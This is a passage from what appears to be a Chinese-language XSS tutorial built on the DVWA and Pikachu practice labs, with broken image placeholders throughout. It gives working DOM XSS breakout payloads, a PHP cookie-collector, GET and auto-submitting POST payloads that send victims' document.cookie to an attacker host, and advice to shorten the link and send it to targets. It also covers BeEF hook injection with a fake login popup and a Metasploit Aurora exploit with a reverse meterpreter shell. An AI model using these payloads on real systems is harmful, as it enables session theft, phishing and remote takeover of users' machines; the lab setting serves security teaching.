<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps48.jpg" alt="img"> </p>
<p>可以看到，我们的js代码执行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps49.jpg" alt="img"> </p>
<p>查看数据库，我们的代码被插入进数据库了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps50.jpg" alt="img"> </p>
<p>查看源代码，可以看到name位置插入了我们的img标签</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps51.jpg" alt="img"> </p>
<h4 id="4-2-4-impossible级别"><a href="#4-2-4-impossible级别" class="headerlink" title="4.2.4 impossible级别"></a><strong>4.2.4 impossible级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps52.jpg" alt="img"> </p>
<p>可以看到，这次impossible在high级别的基础上对name参数也进行了更严格的过滤，导致name参数也无法进行XSS攻击。而且使用了Anti-CSRF token防止CSRF攻击，完全杜绝了XSS漏洞和CSRF漏洞。</p>
<h3 id="4-3-DVWA-之DOM-XSS-DOM型跨站脚本攻击"><a href="#4-3-DVWA-之DOM-XSS-DOM型跨站脚本攻击" class="headerlink" title="4.3 DVWA****之DOM XSS(DOM型跨站脚本攻击)"></a><strong>4.3</strong> <strong>DVWA****之DOM XSS(DOM型跨站脚本攻击)</strong></h3><h4 id="4-3-1-Low级别"><a href="#4-3-1-Low级别" class="headerlink" title="4.3.1 Low级别"></a><strong>4.3.1 Low级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps53.jpg" alt="img"> </p>
<p>从源代码可以看出，这里low级别的代码没有任何的保护性措施！</p>
<p>页面本意是叫我们选择默认的语言，但是对default参数没有进行任何的过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps54.jpg" alt="img"> </p>
<p>所以我们可以构造XSS代码，访问链接：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/xss_d/?default=">http://127.0.0.1/vulnerabilities/xss_d/?default=</a><script>alert('hack')</script></p>
<p>可以看到，我们的script脚本成功执行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps55.jpg" alt="img"> </p>
<p>我们查看源代码，可以看到，我们的脚本插入到代码中，所以执行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps56.jpg" alt="img"> </p>
<h4 id="4-3-2-Medium级别"><a href="#4-3-2-Medium级别" class="headerlink" title="4.3.2 Medium级别"></a><strong>4.3.2 Medium级别</strong></h4><p>源代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps57.jpg" alt="img"> </p>
<p>可以看到，medium级别的代码先检查了default参数是否为空，如果不为空则将default等于获取到的default值。这里还使用了stripos 用于检测default值中是否有 &lt;script ，如果有的话，则将 default&#x3D;English 。</p>
<p>很明显，这里过滤了 <script>(不区分大小写)，那么我们可以使用</p>
<p><imgsrc=1 onerror=('hack')></p>
<p>但是当我们访问URL：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=%3Cimg">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=%3Cimg</a> src=1 onerror=alert('hack')></p>
<p>此时并没有弹出任何页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps58.jpg" alt="img"> </p>
<p>我们查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，所以img标签并没有发起任何作用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps59.jpg" alt="img"> </p>
<p>所以我们得先闭合前面的标签，我们构造语句闭合option标签：</p>
 <option value='   " + lang + "    '>  "  + decodeURI(lang) +  "  </option>

<p>所以，我们构造该链接：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/xss_d/?default=%3E">http://127.0.0.1/vulnerabilities/xss_d/?default=&gt;</a></option><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert('hack')></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps60.jpg" alt="img">但是我们的语句并没有执行，于是我们查看源代码，发现我们的语句中只有 > 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps61.jpg" alt="img"> </p>
<p>于是我们继续构造语句去闭合select标签，这下我们的img标签就是独立的一条语句了</p>
<p>我们构造该链接：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=</a> ></option></select><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert('hack')></p>
<p>我们查看源代码，可以看到，我们的语句已经插入到页面中了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps62.jpg" alt="img"> </p>
<h4 id="4-3-3-High-级别"><a href="#4-3-3-High-级别" class="headerlink" title="4.3.3 High****级别"></a><strong>4.3.3</strong> <strong>High****级别</strong></h4><h4 id="4-3-4-impossible级别"><a href="#4-3-4-impossible级别" class="headerlink" title="4.3.4 impossible级别"></a><strong>4.3.4 impossible级别</strong></h4><h2 id="五、XSS盗取cookie实战"><a href="#五、XSS盗取cookie实战" class="headerlink" title="五、XSS盗取cookie实战"></a><strong>五、XSS盗取cookie实战</strong></h2><h3 id="5-1-XSS常用的小工具"><a href="#5-1-XSS常用的小工具" class="headerlink" title="5.1 XSS常用的小工具"></a><strong>5.1 XSS常用的小工具</strong></h3><p>l Hackbar</p>
<p>l Firebug</p>
<p>l Tamper Data</p>
<p>l Live HTTP Headers</p>
<p>l Editor Cookie</p>
<h3 id="5-2-盗取cookie实战"><a href="#5-2-盗取cookie实战" class="headerlink" title="5.2 盗取cookie实战"></a><strong>5.2 盗取cookie实战</strong></h3><h4 id="5-2-1-反射型XSS（GET）获取cookie"><a href="#5-2-1-反射型XSS（GET）获取cookie" class="headerlink" title="5.2.1 反射型XSS（GET）获取cookie"></a><strong>5.2.1 反射型XSS（GET）获取cookie</strong></h4><p><em><strong>*实验一：DVWA反射型XSS（GET）获取cookie*</strong></em></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps63.jpg" alt="img"> </p>
<p>****第一步：****编写获取cookie的代码cookie.php,并放在一个web服务器上，代码内容如下所示：</p>
<?php

​      $cookie=$_GET['cookie'];

​      file_put_contents('cookie.txt',$cookie);

?><p>设置文件的权限：</p>
<p># ps -axu | grep apache         #查看运行 apache 进程的用户名<br># chown www-data:www-data web.php  #同时改变文件的所有者与属组<br># touch cookie.txt            #创建存 cookie 的文件<br># chown www-data:www-data cookie.txt</p>
<p>****第二步：****重启apache服务器  systemctl restart apache2</p>
<p>****第三步：****使用普通用户构造如下URL，并发送给被攻击者</p>
<p>完整的 URL：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.149.170/dvwa/vulnerabilities/xss_r/?name=">http://192.168.149.170/dvwa/vulnerabilities/xss_r/?name=</a><script>document.location='<a target="_blank" rel="noopener" href="http://192.168.149.156/a.php?cookie=%27+">http://192.168.149.156/a.php?cookie=&#39;+</a> document.cookie</script></p>
<p>但是通过这样访问，因为 url 中直接有“js 脚本”有时服务器会拒绝，不成功。所以我们需要对payload进行URL编码，如下所示：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.149.170/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location=%27http://192.168.149.156/a.php?cookie=%27+%20document.cookie%3C/script%3E">http://192.168.149.170/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location=%27http:%2f%2f192.168.149.156%2fa.php?cookie=%27%2b%20document.cookie%3C%2fscript%3E</a></p>
<p>将进行URL编码后的地址输入<a target="_blank" rel="noopener" href="http://aad.tw/%E7%BD%91%E7%AB%99%E7%94%9F%E6%88%90%E7%9F%AD%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B9%B6%E5%8F%91%E9%80%81%E7%BB%99%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E3%80%82">http://aad.tw/网站生成短地址，并发送给其他用户点击。</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps64.jpg" alt="img"> </p>
<p>****第四步：****在kali中查看Cookie 信息<br># cat &#x2F;var&#x2F;www&#x2F;html&#x2F;cookie.txt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps65.jpg" alt="img"> </p>
<p>第五步：如果是管理员点击了这个链接，我们就可以通获得的cookie提升权限。</p>
<p>打开burp抓包并修改cookie信息，如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps66.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps67.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps68.jpg" alt="img"> </p>
<p><em><strong>*实验二：Pikachu XSS平台搭建及后台使用（盗取cookie）*</strong></em></p>
<p><strong>1.</strong> <em><strong>*XSS平台搭建及后台使用*</strong></em></p>
<p>访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/pkxss/%E8%BF%9B%E8%A1%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E3%80%82">http://127.0.0.1/pikachu/pkxss/进行初始化。</a></p>
<p>将pikachu目录下的pkxss文件夹复制到攻击机上，并修改如下代码：</p>
<p><strong>（1）</strong><em><strong>*修改数据库连接*</strong></em></p>
<p>修改inc目录下的config.inc.php文件</p>
<?php

//全局session_start

session_start(); //全局居设置时区

date_default_timezone_set('Asia/Shanghai');//全局设置默认字符

header('Content-type:text/html;charset=utf-8');//定义数据库连接参数

define('DBHOST', 'localhost');//将localhost修改为数据库服务器的地址

define('DBUSER', 'root');//将root修改为连接mysql的用户名

define('DBPW', '123456');//将root修改为连接mysql的密码

define('DBNAME', 'pkxss');//自定义，建议不修改

define('DBPORT', '3306');//将3306修改为mysql的连接端口，默认tcp3306

?>

<p><em><strong>*（2）修改xcookie目录下的cookie.php文件（文件中的代码是用来获取用户的cookie）*</strong></em></p>
<?php

include_once '../inc/config.inc.php';

include_once '../inc/mysql.inc.php';

$link=connect();

//这个是获取cookie的api页面

if(isset($_GET['cookie'])){

  $time=date('Y-m-d g:i:s');

  $ipaddress=getenv ('REMOTE_ADDR');

  $cookie=$_GET['cookie'];

  $referer=$_SERVER['HTTP_REFERER'];

  $useragent=$_SERVER['HTTP_USER_AGENT'];

  $query="insert cookies(time,ipaddress,cookie,referer,useragent) 

  values('$time','$ipaddress','$cookie','$referer','$useragent')";

  $result=mysqli_query($link, $query);

}

header("Location:http://192.168.149.128/pikachu/index.php");//重定向到一个可信的网站

?>

<p><em><strong>*（3）登录XSS平台*</strong></em></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps69.jpg" alt="img"> </p>
<p>获取cookie的php文件是：<a target="_blank" rel="noopener" href="http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php">http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php</a></p>
<p><strong>2.</strong> <em><strong>*盗取cookie*</strong></em></p>
<p>测试URL：<a target="_blank" rel="noopener" href="http://192.168.149.128/pikachu/vul/xss/xss_reflected_get.php">http://192.168.149.128/pikachu/vul/xss/xss_reflected_get.php</a></p>
<p>（1）测试是否存在XSS漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps70.jpg" alt="img"> </p>
<p>（2）构造盗取cookie的语句并点击提交</p>
<script>document.location='http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php?cookie='+ document.cookie</script>

<p>（3）查看获取的cookie信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps71.jpg" alt="img"> </p>
<p>由于这是个存储型XSS，所以Payload会存储在后台数据库，当其他用户只要访问到这个页面就会触发payload，cookie就会被盗。</p>
<h4 id="5-2-2-反射型XSS（POST）获取cookie"><a href="#5-2-2-反射型XSS（POST）获取cookie" class="headerlink" title="5.2.2 反射型XSS（POST）获取cookie"></a><strong>5.2.2 反射型XSS（POST）获取cookie</strong></h4><p>POST请求方式的XSS攻击其实是比较难实现的，因为要构造一个网页html文件出来</p>
<p>POST攻击利用页面：&#x2F;pikachu&#x2F;pkxss&#x2F;xcookie&#x2F;post.html</p>
<p>构造的Payload页面：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/pkxss/xcookie/post.html">http://127.0.0.1/pikachu/pkxss/xcookie/post.html</a></p>
<p>首先要【以test用户（密码abc123）】登录到网站，找到存在XSS漏洞的页面，并根据页面创建一个html文件（已经存在：&#x2F;pikachu&#x2F;pkxss&#x2F;xcookie&#x2F;post.html）。根据网站页面对文件做如下修改：</p>
<html>

<head>

<script>

window.onload = function() {  //当浏览器加载完页面所有的内容后自动触发执行

 document.getElementById("postsubmit").click();

}

</script>

</head>

<body>

<form method="post" action="http://192.168.149.128/pikachu/vul/xss/xsspost/xss_reflected_post.php">

<p>  &lt;input id&#x3D;”xssr_in” type&#x3D;”text” name&#x3D;”message” value&#x3D;</p>
<p>  “<script></p>
<p>document.location = '<a target="_blank" rel="noopener" href="http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php?cookie=">http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php?cookie=</a>' + document.cookie;</p>
<p> </script>“</p>
<p>  &#x2F;&gt;</p>
  <input id="postsubmit" type="submit" name="submit" value="submit" />

</form>

</body>

</html>

<!--

 \* 

<script>

document.write('<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://127.0.0.1/antxss/xcookie/cookie.php?cookie='+document.cookie+'" width="0" height="0" border="0" />');

</script>

*/

/*

<script>

document.location = 'http://127.0.0.1/antxss/xcookie/cookie.php?cookie=' + document.cookie;

</script>

*/

-->

<p>最后将这个页面的访问地址发给用户，一旦用户以管理员admin登录，并点击了这个页面，那么他的cookie就会被盗。如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps72.jpg" alt="img"> </p>
<h2 id="六、XSS-beef的使用实例"><a href="#六、XSS-beef的使用实例" class="headerlink" title="六、XSS-beef的使用实例"></a><strong>六、XSS-beef的使用实例</strong></h2><h3 id="6-1-劫持客户端浏览器"><a href="#6-1-劫持客户端浏览器" class="headerlink" title="6.1 劫持客户端浏览器"></a><strong>6.1 劫持客户端浏览器</strong></h3><p>****第一步：****安装并配置beef-xss</p>
<p># apt-get install beef-xss   安装beef-xss</p>
<p># systemctl start apache2  启动apache服务</p>
<p># cd &#x2F;usr&#x2F;share&#x2F;beef-xss   进入安装目录</p>
<p>#.&#x2F;beef          启动beef-xss会提示更改默认用户名和密码</p>
<p># vim &#x2F;etc&#x2F;beef-xss&#x2F;config.yaml 在这个文件中修改用户名和密码</p>
<p>#.&#x2F;beef   启动beef-xss，此时会启动成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps73.jpg" alt="img"> </p>
<p>在浏览器输入：<a target="_blank" rel="noopener" href="http://192.168.149.156:3000/ui/panel">http://192.168.149.156:3000/ui/panel</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps74.jpg" alt="img"> </p>
<p>****第二步：****找到存在XSS漏洞的留言板，并输入以下留言，构造的payload如下：</p>
<script src=http://192.168.149.156:3000/hook.js></script>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps75.jpg" alt="img"> </p>
<p>****第三步：****用户浏览留言中招</p>
<p>在beef-xss服务器上就可以看到浏览这个页面的浏览器就被控制了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps76.jpg" alt="img"> </p>
<p>beef-XSS使用四种颜色来标识功能的可用性。</p>
<p>「绿色」：可以运行，且用户不会感觉出异常</p>
<p>「橙色」：可以运行，但用户可能感到异常（弹窗等）</p>
<p>「灰色」：未验证，不确定是否可以使用</p>
<p>「红色」：不可用</p>
<p>****第四步：****控制浏览器访问指定的网站</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps77.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps78.jpg" alt="img"> </p>
<p><em><strong>*工*</strong></em><em><strong>*作*</strong></em><em><strong>*原理*</strong></em></p>
<p>beef-XSS有一个内置的 hook.js 文件，文件里是一些用来交互的JS代码。</p>
<p>我们提交payload的时候，其实就是把这个「Hook脚本」挂到了网页上。</p>
<p>挂上去以后，beef-XSS就可以通过「Hook脚本」，和网页进行交互。</p>
<p>我们提交的payload实际上就是在页面插入了一行js代码，代码的内容是一个链接，指向了beef-XSS的hook.js文件：</p>
<p>****第五步：****社工弹窗</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps79.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps80.jpg" alt="img"> </p>
<p>目标“登录”后，信息就会提交到工具中，点击对应的记录就可查看提交的信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps81.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps82.jpg" alt="img"> </p>
<h3 id="6-2-利用beef-msf拿用户shell-基于客户端ie6"><a href="#6-2-利用beef-msf拿用户shell-基于客户端ie6" class="headerlink" title="6.2 利用beef+msf拿用户shell(基于客户端ie6 )"></a><strong>6.2 利用beef+msf拿用户shell(基于客户端ie6 )</strong></h3><p>****第一步：****启动beef-xss</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps83.jpg" alt="img"> </p>
<p><strong>第二步：</strong>配置msf </p>
<p># msfconsole </p>
<p>msf6 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;<em><strong>*ms10_002_aurora*</strong></em>   浏览器极光漏洞</p>
<p>&gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>msf6 exploit(windows&#x2F;browser&#x2F;ms10_002_aurora) &gt; set srvhost 192.168.149.156</p>
<p>srvhost &#x3D;&gt; 192.168.149.156</p>
<p>msf6 exploit(windows&#x2F;browser&#x2F;ms10_002_aurora) &gt; set srvport 7777</p>
<p>srvport &#x3D;&gt; 7777</p>
<p>msf6 exploit(windows&#x2F;browser&#x2F;ms10_002_aurora) &gt; set uripath</p>
<p>uripath &#x3D;&gt; </p>
<p>msf6 exploit(windows&#x2F;browser&#x2F;ms10_002_aurora) &gt; set lhost 192.168.149.156</p>
<p>lhost &#x3D;&gt; 192.168.149.156</p>
<p>msf6 exploit(windows&#x2F;browser&#x2F;ms10_002_aurora) &gt; set lport 4444</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps84.jpg" alt="img"> </p>
<p><em><strong>*<a target="_blank" rel="noopener" href="http://192.168.149.156:7777/QTzutFSfMackd/">http://192.168.149.156:7777/QTzutFSfMackd\</a>*</strong></em></p>
<p><strong>第三步：</strong>劫持用户浏览器</p>
<p>找到存在XSS漏洞的留言板，并输入以下留言，构造的payload如下：</p>
<script src=http://192.168.149.156:3000/hook.js></script>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps85.jpg" alt="img"> </p>
<p>用户浏览留言后，在beef-xss服务器上就可看到浏览这个页面的浏览器就被控制了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps86.jpg" alt="img"> </p>
<p><strong>第四步：</strong>劫持浏览器后，将链接发给客户端用户访问，客户端计算机就会被kali控制。</p>
<p>URL: <a target="_blank" rel="noopener" href="http://192.168.149.156:7777/KFdwDzDz">http://192.168.149.156:7777/KFdwDzDz</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps87.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps88.jpg" alt="img"> </p>
<p><strong>第五步：</strong>在kali机查看访问这个页面的用户电脑是否被控制</p>
